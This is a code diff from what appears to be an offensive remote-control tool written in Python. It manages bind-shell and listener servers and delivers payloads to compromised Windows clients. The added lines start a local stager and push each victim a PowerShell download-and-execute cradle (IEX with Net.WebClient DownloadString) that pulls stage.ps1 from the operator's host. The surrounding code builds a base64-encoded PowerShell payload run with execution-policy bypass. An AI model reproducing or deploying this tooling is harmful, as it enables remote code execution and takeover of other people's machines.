@@ -73,16 +73,10 @@ def printListener():
             ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
             connectserver = Server(ipADDR, 5556, bindsocket=False)
             serverlist.append(connectserver)
-            async = threading.Thread(target=asyncore.loop, args=(0.1,))
-            async.setDaemon(True)
-            async.start()
     else:
         if not '5555' in str(serverlist):
             listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
             serverlist.append(listenerserver)
-            async = threading.Thread(target=asyncore.loop, args=(0.1,))
-            async.setDaemon(True)
-            async.start()
     return "pass"
 
 
@@ -121,7 +115,12 @@ def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
         encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
         powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
     clientnumber = int(clientnumber)
+    randomPort = FUNCTIONS().randomUnusedPort()
+    powershellStage = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')"% (FUNCTIONS().CheckInternet(), randomPort)
+    a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(powershellExec, randomPort))
+    a.daemon = True
+    a.start()
     from menu import clientMenuOptions
     for server in serverlist:
         if clientnumber in server.handlers.keys():
-            server.handlers[clientnumber].out_buffer.append(powershellExec)
+            server.handlers[clientnumber].out_buffer.append(powershellStage)
